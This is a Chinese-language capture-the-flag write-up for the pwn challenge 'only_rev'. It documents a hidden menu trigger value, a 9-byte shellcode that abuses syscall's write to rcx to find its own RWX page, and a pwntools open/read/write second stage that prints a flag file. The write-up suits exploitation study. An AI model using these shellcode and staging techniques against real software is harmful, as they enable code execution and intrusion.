# only_rev

## 题目简述

`only_rev` 与 `only` 使用相同的隐藏入口：向 bookkeeping 输入原始位模式为 `0x0d0e0a0d0b0e0e0f` 的 double，即十进制 `8.5925645443139351e-246`，再选择隐藏菜单的“run your code”，可在一页 RWX 内存中执行最多 9 字节。前置 stub 会把通用寄存器清零，因而初始 `rax = rdi = rdx = 0`。

本题的重点是只凭这 9 字节取得当前 RWX 页地址。仓库的 `Pwn/only_rev` 目录只有一份 TODO `README.md`，没有附件、源码或单题 WP；以下机制来自总 PDF 第 160 至 162 页，无法再用仓库源码交叉验证，且 PDF 未给出最终 flag 文本。

## 解题过程

### 1. 利用 `syscall` 对 `rcx` 的副作用

x86-64 执行 `syscall` 时，CPU 会把下一条指令的地址保存到 `rcx`，把当前 RFLAGS 保存到 `r11`。这一硬件行为恰好能泄露正在执行的 RWX 代码地址。

第一阶段严格控制为 9 字节：

```asm
syscall           /* read(0, 0, 0)，不传数据，但 rcx = 下一条指令地址 */
mov rsi, rcx      /* rsi 指向当前 RWX 页内 */
mov dl, 0xff      /* rdx = 255 */
syscall           /* read(0, rsi, 0xff) */
```

对应长度为 `2 + 3 + 2 + 2 = 9`。第一次系统调用因为 `rax = rdi = rdx = 0`，等价于零长度 `read(0, NULL, 0)`，不会访问空指针；它的作用只是让 `rcx` 获得第一条 `syscall` 后方的 RIP。第二次系统调用则把最多 255 字节读到该地址。

### 2. 原地覆盖为第二阶段

第二次 `read` 的目的地址位于第一阶段自身中间，会覆盖 `mov rsi, rcx` 之后的代码。覆盖发生在内核执行系统调用期间，返回 RIP 位于同一缓冲区稍后的位置；只要传入数据以足够长的 NOP sled 开头，返回后就会落入 NOP 并继续执行新载荷。

PDF 使用的第二阶段结构是：

```python
asm(
    'nop;' * 0x40 +
    'lea rsp, [rip+0x800];' +
    shellcraft.open('flag', 0, 0) +
    shellcraft.read('rax', 'rsp', 0x100) +
    shellcraft.write(1, 'rsp', 0x100)
)
```

`lea rsp, [rip+0x800]` 把栈迁入同一 RWX 映射的空闲区域，避免题目固定 stub 对原栈指针的平移影响后续 shellcode。之后以 `open/read/write` 读取相对路径 `flag`；若实际部署使用 `/flag`，只需同步替换路径。

### 3. 完整交互顺序

1. 进入 bookkeeping，发送 `8.5925645443139351e-246` 触发隐藏菜单。
2. 选择执行代码，发送上述 9 字节第一阶段。
3. 等待第一阶段进入第二个 `read`，一次性发送 NOP sled、栈迁移和 ORW。
4. 第二次 `syscall` 返回到已被覆盖的 RWX 区，沿 NOP sled 执行第二阶段并输出 flag。

总 PDF 中还保留了另一份与 `only` 相同的 `pop rdx/pop rsi/.../syscall` 片段，但 `only_rev` 专属 exploit 使用的是 `syscall → rcx → rsi → syscall`，后者不需要猜平移后栈上的值，因果链也更完整。

## 方法总结

- `syscall` 不仅进入内核，还固定改写 `rcx` 和 `r11`；在极短 shellcode 场景中，零长度系统调用可作为两字节的 RIP 获取原语。
- 初始寄存器清零使第一次调用安全地退化为 `read(0, NULL, 0)`，第二次再用 `rcx` 和 `dl` 补齐缓冲区与长度。
- 第二阶段会原地覆盖第一阶段，必须用 NOP sled 覆盖系统调用返回位置，并在进入 ORW 前把 `rsp` 迁到确定可写的区域。
- 由于仓库缺少该题附件和源码，偏移、flag 路径及运行稳定性只能以总 PDF 为证据，不能外推到其它构建。
